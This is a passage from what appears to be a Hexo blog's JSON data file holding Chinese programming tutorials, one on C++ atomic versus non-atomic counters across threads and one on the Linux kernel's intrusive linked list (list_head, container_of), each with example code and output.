class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++)&#123;</div><div class=\"line\">\t\tiCount++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"keyword\">atomic_bool</span> b;</div><div class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">std</span>::thread&gt; lstThread;</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i)</div><div class=\"line\">    &#123;</div><div class=\"line\">        lstThread.push_back(<span class=\"built_in\">std</span>::thread(threadfun1,i));</div><div class=\"line\">\t\tlstThread[i].detach();</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"function\">thread <span class=\"title\">th1</span><span class=\"params\">(threadfun_atomic,i)</span></span>;</div><div class=\"line\">\t\t<span class=\"comment\">//自己释放内存</span></div><div class=\"line\">\t\t<span class=\"comment\">//http://www.cnblogs.com/bits/archive/2009/12/04/no_join_or_detach_memory_leak.html</span></div><div class=\"line\">\t\tth1.detach();</div><div class=\"line\">    &#125;</div><div class=\"line\">\tusleep(<span class=\"number\">1000000</span>);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"iCnt=%d,iCount=%d \\n\"</span>,iCnt,(<span class=\"keyword\">int</span>)iCount);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果:\"></a>执行结果:</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">iCnt=<span class=\"number\">10000000</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">8487677</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">8595552</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">7772070</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">7820366</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">4151170</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">9490318</span>,iCount=<span class=\"number\">1000000</span></div></pre></td></tr></table></figure>\n<h2 id=\"进一步思考\"><a href=\"#进一步思考\" class=\"headerlink\" title=\"进一步思考\"></a>进一步思考</h2><ul>\n<li>无锁操作是什么</li>\n</ul>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li>原子操作 vs 非原子操作(<a href=\"http://blog.jobbole.com/54345/\" target=\"_blank\" rel=\"external\">http://blog.jobbole.com/54345/</a>)</li>\n<li>聊聊并发（五）——原子操作的实现原理(<a href=\"http://www.infoq.com/cn/articles/atomic-operation\" target=\"_blank\" rel=\"external\">http://www.infoq.com/cn/articles/atomic-operation</a>)</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。    </p>\n<h2 id=\"处理器如何实现的原子操作？\"><a href=\"#处理器如何实现的原子操作？\" class=\"headerlink\" title=\"处理器如何实现的原子操作？\"></a>处理器如何实现的原子操作？</h2><p><a href=\"http://www.infoq.com/cn/articles/atomic-operation\">http://www.infoq.com/cn/articles/atomic-operation</a><br>处理器使用<strong>总线锁</strong>就是来解决这个问题的。   </p>\n<h2 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;thread&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;atomic&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;list&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"comment\">//原子++</span></div><div class=\"line\"><span class=\"built_in\">std</span>::<span class=\"function\"><span class=\"keyword\">atomic_int</span> <span class=\"title\">iCount</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span>;</div><div class=\"line\"><span class=\"comment\">//非原子性++</span></div><div class=\"line\"><span class=\"keyword\">int</span> iCnt;</div><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\">非原子加多线程下最后的结果不确定！！！</div><div class=\"line\">iCnt=4853200...</div><div class=\"line\">iCnt=9889662...</div><div class=\"line\">iCnt=10000000...</div><div class=\"line\">iCnt=10000000...</div><div class=\"line\">*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">threadfun1</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">1000000</span>;i++)&#123;</div><div class=\"line\">\t\tiCnt++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*原子++*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">threadfun_atomic</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100000</span>;i++)&#123;</div><div class=\"line\">\t\tiCount++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"keyword\">atomic_bool</span> b;</div><div class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">std</span>::thread&gt; lstThread;</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i)</div><div class=\"line\">    &#123;</div><div class=\"line\">        lstThread.push_back(<span class=\"built_in\">std</span>::thread(threadfun1,i));</div><div class=\"line\">\t\tlstThread[i].detach();</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"function\">thread <span class=\"title\">th1</span><span class=\"params\">(threadfun_atomic,i)</span></span>;</div><div class=\"line\">\t\t<span class=\"comment\">//自己释放内存</span></div><div class=\"line\">\t\t<span class=\"comment\">//http://www.cnblogs.com/bits/archive/2009/12/04/no_join_or_detach_memory_leak.html</span></div><div class=\"line\">\t\tth1.detach();</div><div class=\"line\">    &#125;</div><div class=\"line\">\tusleep(<span class=\"number\">1000000</span>);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"iCnt=%d,iCount=%d \\n\"</span>,iCnt,(<span class=\"keyword\">int</span>)iCount);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果:\"></a>执行结果:</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">iCnt=<span class=\"number\">10000000</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">8487677</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">8595552</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">7772070</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">7820366</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">4151170</span>,iCount=<span class=\"number\">1000000</span> </div><div class=\"line\">iCnt=<span class=\"number\">9490318</span>,iCount=<span class=\"number\">1000000</span></div></pre></td></tr></table></figure>\n<h2 id=\"进一步思考\"><a href=\"#进一步思考\" class=\"headerlink\" title=\"进一步思考\"></a>进一步思考</h2><ul>\n<li>无锁操作是什么</li>\n</ul>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li>原子操作 vs 非原子操作(<a href=\"http://blog.jobbole.com/54345/\">http://blog.jobbole.com/54345/</a>)</li>\n<li>聊聊并发（五）——原子操作的实现原理(<a href=\"http://www.infoq.com/cn/articles/atomic-operation\">http://www.infoq.com/cn/articles/atomic-operation</a>)</li>\n</ul>\n"},{"title":"Linux内核中的链表巧妙实现","date":"2017-01-09T15:11:19.000Z","_content":"\n## 定义\n链表是我们学习数据结构课程中首先学的并且是最为基础且最重要的一种数据结构类型。   \n可以用一种最简单的数据结构来表示这样的一个链表：  \n```cpp\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n```\n\n双向链表：   \n```cpp\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* pre;\n\tstruct list_element* next;\n};\n```\n\n## Linux内核中的实现\n相比普通的链表实现方式，Linux内核的实现可以说独树一帜。前面提到的数据通过内部添加一个指向数据的next（或者pre）节点指针，才能串联在链表中。比如，假设我们有一个fox数据结构来表述狐狸：\n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙\n}\n```\n存储这个结构到链表里的通常方法是在数据结构中嵌入一个链表指针，比如：\n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙\n    struct fox *next;\n    struct fox *prev;\n}\n```\n**Linux内核方式与众不同，它不是将数据结构塞入链表，而是将链表节点塞入数据结构！！**   \n链表代码在头文件`<linux/list.h>`其数据结构很简单：\n```cpp\nstruct list_head {\n    struct list_head *next;\n    struct list_head *prev;\n}\n```\n`next`指针指向下一个链表节点，`prev`指针指向前一个。然而，似乎这里还看不出它们有多大作用。到底什么才是链表存储的具体内容呢？其实关键在于理解`list_head`结构是如何使用的。  \n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙 \n    struct list_head list;//所有fox结构体形成链表\n}\n```\n上述结构中，fox中的`list.next`指向下一个元素，`list.prev`指向前一个元素。现在链表已经能用了，但是显然还不够方便。因此**内核又提供了一组链表操作例程。**比如，`list_add()`方法假如一个新节点到链表中。但是，这些方法都有一个统一的特点：它们只接受list_head结构作为参数。使用宏`container_of()`我们可以很方便地从链表指针找到父结构中包含的任何变量。**这是因为在C语言中，一个给定结构中的变量偏移在编译时地址就被ABI固定下来了。**\n```cpp\n#define container_of(ptr, type, member) \\\n    (type *)((char *)(ptr) - (char *) &((type *)0)->member)\n```\n\n## 操作链表\n- 增加节点：\n> list_add(struct list_head *new,struct list_head *head);\n- 删除节点：\n> list_del(struct list_head *entry);\n- 移动和合并链表节点\n> list_move(struct list_head *list,struct list_head *head);\n- 较差链表是否为空：\n> list_empty(struct list_head *head);\n\n## 遍历链表\n- 常用的遍历方法\n> list_for_each_entry(pos,head,member)\n- 反向遍历\n> list_for_each_entry_reverse(pos,head,member);\n- 遍历的同时删除\n> list_for_each_entry_safe(pos,next,head,member);\n\n## 完整例程\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <stddef.h>\n#include \"include/list.h\"\n\nstruct foo{\n    int id;\n    struct list_head entry;\n};\n\nint main(){\n    printf(\"hello world!\\n\");\n    struct foo fo;\n    INIT_LIST_HEAD(&fo.entry);\n\n    struct foo *first = (struct foo *)malloc(sizeof(struct foo));\n    struct foo *second= (struct foo *)malloc(sizeof(struct foo));\n    first->id = 999;\n    second->id = 888;\n    list_add(&first->entry,&fo.entry);\n    list_add_tail(&second->entry,&fo.entry);\n\n    struct foo *iterator;\n    list_for_each_entry(iterator, &fo.entry, entry) {\n        printf(\"id=%d\\n\",iterator->id);\n    }\n\n\tstruct foo  *next;\n\tlist_for_each_entry_safe(iterator, next, &fo.entry, entry) {\n\t\t//\tlist_del(&iterator->entry);\n//\t\tfree(iterator);\n\t}\n\tprintf(\"empty ? %d\\n\",list_empty(&fo.entry));\n\tfirst = list_first_entry(&fo.entry, struct foo, entry);\n\n    list_for_each_entry(iterator, &fo.entry, entry) {\n        printf(\"id=%d\\n\",iterator->id);\n    }\n\tfree(first);\n\tfree(second);\n}\n\n```\n","source":"_posts/Linux内核中的链表巧妙实现.md","raw":"---\ntitle: Linux内核中的链表巧妙实现\ndate: 2017-01-09 23:11:19\ncategories: Linux内核\n---\n\n## 定义\n链表是我们学习数据结构课程中首先学的并且是最为基础且最重要的一种数据结构类型。   \n可以用一种最简单的数据结构来表示这样的一个链表：  \n```cpp\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n```\n\n双向链表：   \n```cpp\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* pre;\n\tstruct list_element* next;\n};\n```\n\n## Linux内核中的实现\n相比普通的链表实现方式，Linux内核的实现可以说独树一帜。前面提到的数据通过内部添加一个指向数据的next（或者pre）节点指针，才能串联在链表中。比如，假设我们有一个fox数据结构来表述狐狸：\n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙\n}\n```\n存储这个结构到链表里的通常方法是在数据结构中嵌入一个链表指针，比如：\n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙\n    struct fox *next;\n    struct fox *prev;\n}\n```\n**Linux内核方式与众不同，它不是将数据结构塞入链表，而是将链表节点塞入数据结构！！**   \n链表代码在头文件`<linux/list.h>`其数据结构很简单：\n```cpp\nstruct list_head {\n    struct list_head *next;\n    struct list_head *prev;\n}\n```\n`next`指针指向下一个链表节点，`prev`指针指向前一个。然而，似乎这里还看不出它们有多大作用。到底什么才是链表存储的具体内容呢？其实关键在于理解`list_head`结构是如何使用的。  \n```cpp\nstruct fox {\n    unsigned long tail_length;//尾巴长度\n    unsigned long weight;//重量\n    bool is_fantastic;//是否奇妙 \n    struct list_head list;//所有fox结构体形成链表\n}\n```\n上述结构中，fox中的`list.next`指向下一个元素，`list.prev`指向前一个元素。现在链表已经能用了，但是显然还不够方便。因此**内核又提供了一组链表操作例程。**比如，`list_add()`方法假如一个新节点到链表中。但是，这些方法都有一个统一的特点：它们只接受list_head结构作为参数。使用宏`container_of()`我们可以很方便地从链表指针找到父结构中包含的任何变量。**这是因为在C语言中，一个给定结构中的变量偏移在编译时地址就被ABI固定下来了。**\n```cpp\n#define container_of(ptr, type, member) \\\n    (type *)((char *)(ptr) - (char *) &((type *)0)->member)\n```\n\n## 操作链表\n- 增加节点：\n> list_add(struct list_head *new,struct list_head *head);\n- 删除节点：\n> list_del(struct list_head *entry);\n- 移动和合并链表节点\n> list_move(struct list_head *list,struct list_head *head);\n- 较差链表是否为空：\n> list_empty(struct list_head *head);\n\n## 遍历链表\n- 常用的遍历方法\n> list_for_each_entry(pos,head,member)\n- 反向遍历\n> list_for_each_entry_reverse(pos,head,member);\n- 遍历的同时删除\n> list_for_each_entry_safe(pos,next,head,member);\n\n## 完整例程\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <stddef.h>\n#include \"include/list.h\"\n\nstruct foo{\n    int id;\n    struct list_head entry;\n};\n\nint main(){\n    printf(\"hello world!\\n\");\n    struct foo fo;\n    INIT_LIST_HEAD(&fo.entry);\n\n    struct foo *first = (struct foo *)malloc(sizeof(struct foo));\n    struct foo *second= (struct foo *)malloc(sizeof(struct foo));\n    first->id = 999;\n    second->id = 888;\n    list_add(&first->entry,&fo.entry);\n    list_add_tail(&second->entry,&fo.entry);\n\n    struct foo *iterator;\n    list_for_each_entry(iterator, &fo.entry, entry) {\n        printf(\"id=%d\\n\",iterator->id);\n    }\n\n\tstruct foo  *next;\n\tlist_for_each_entry_safe(iterator, next, &fo.entry, entry) {\n\t\t//\tlist_del(&iterator->entry);\n//\t\tfree(iterator);\n\t}\n\tprintf(\"empty ? %d\\n\",list_empty(&fo.entry));\n\tfirst = list_first_entry(&fo.entry, struct foo, entry);\n\n    list_for_each_entry(iterator, &fo.entry, entry) {\n        printf(\"id=%d\\n\",iterator->id);\n    }\n\tfree(first);\n\tfree(second);\n}\n\n```\n","slug":"Linux内核中的链表巧妙实现","published":1,"updated":"2017-01-14T03:00:52.128Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cixyddgq900020dtqcql8p6ti","content":"<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p>链表是我们学习数据结构课程中首先学的并且是最为基础且最重要的一种数据结构类型。<br>可以用一种最简单的数据结构来表示这样的一个链表：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>双向链表：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* pre;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<h2 id=\"Linux内核中的实现\"><a href=\"#Linux内核中的实现\" class=\"headerlink\" title=\"Linux内核中的实现\"></a>Linux内核中的实现</h2><p>相比普通的链表实现方式，Linux内核的实现可以说独树一帜。前面提到的数据通过内部添加一个指向数据的next（或者pre）节点指针，才能串联在链表中。比如，假设我们有一个fox数据结构来表述狐狸：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>存储这个结构到链表里的通常方法是在数据结构中嵌入一个链表指针，比如：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙</span></div><div class=\"line\">    <span class=\"keyword\">struct</span> fox *next;</div><div class=\"line\">    <span class=\"keyword\">struct</span> fox *prev;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><strong>Linux内核方式与众不同，它不是将数据结构塞入链表，而是将链表节点塞入数据结构！！</strong><br>链表代码在头文件<code>&lt;linux/list.h&gt;</code>其数据结构很简单：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_head &#123;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head *next;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head *prev;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><code>next</code>指针指向下一个链表节点，<code>prev</code>指针指向前一个。然而，似乎这里还看不出它们有多大作用。到底什么才是链表存储的具体内容呢？其实关键在于理解<code>list_head</code>结构是如何使用的。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙 </span></div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head <span class=\"built_in\">list</span>;<span class=\"comment\">//所有fox结构体形成链表</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>上述结构中，fox中的<code>list.next</code>指向下一个元素，<code>list.prev</code>指向前一个元素。现在链表已经能用了，但是显然还不够方便。因此<strong>内核又提供了一组链表操作例程。</strong>比如，<code>list_add()</code>方法假如一个新节点到链表中。但是，这些方法都有一个统一的特点：它们只接受list_head结构作为参数。使用宏<code>container_of()</code>我们可以很方便地从链表指针找到父结构中包含的任何变量。<strong>这是因为在C语言中，一个给定结构中的变量偏移在编译时地址就被ABI固定下来了。</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> container_of(ptr, type, member) \\</span></div><div class=\"line\">    (type *)((char *)(ptr) - (char *) &amp;((type *)0)-&gt;member)</div></pre></td></tr></table></figure></p>\n<h2 id=\"操作链表\"><a href=\"#操作链表\" class=\"headerlink\" title=\"操作链表\"></a>操作链表</h2><ul>\n<li>增加节点：<blockquote>\n<p>list_add(struct list_head <em>new,struct list_head </em>head);</p>\n</blockquote>\n</li>\n<li>删除节点：<blockquote>\n<p>list_del(struct list_head *entry);</p>\n</blockquote>\n</li>\n<li>移动和合并链表节点<blockquote>\n<p>list_move(struct list_head <em>list,struct list_head </em>head);</p>\n</blockquote>\n</li>\n<li>较差链表是否为空：<blockquote>\n<p>list_empty(struct list_head *head);</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"遍历链表\"><a href=\"#遍历链表\" class=\"headerlink\" title=\"遍历链表\"></a>遍历链表</h2><ul>\n<li>常用的遍历方法<blockquote>\n<p>list_for_each_entry(pos,head,member)</p>\n</blockquote>\n</li>\n<li>反向遍历<blockquote>\n<p>list_for_each_entry_reverse(pos,head,member);</p>\n</blockquote>\n</li>\n<li>遍历的同时删除<blockquote>\n<p>list_for_each_entry_safe(pos,next,head,member);</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"完整例程\"><a href=\"#完整例程\" class=\"headerlink\" title=\"完整例程\"></a>完整例程</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stddef.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"include/list.h\"</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> foo&#123;</div><div class=\"line\">    <span class=\"keyword\">int</span> id;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head entry;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world!\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">struct</span> foo fo;</div><div class=\"line\">    INIT_LIST_HEAD(&amp;fo.entry);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">struct</span> foo *first = (<span class=\"keyword\">struct</span> foo *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> foo));</div><div class=\"line\">    <span 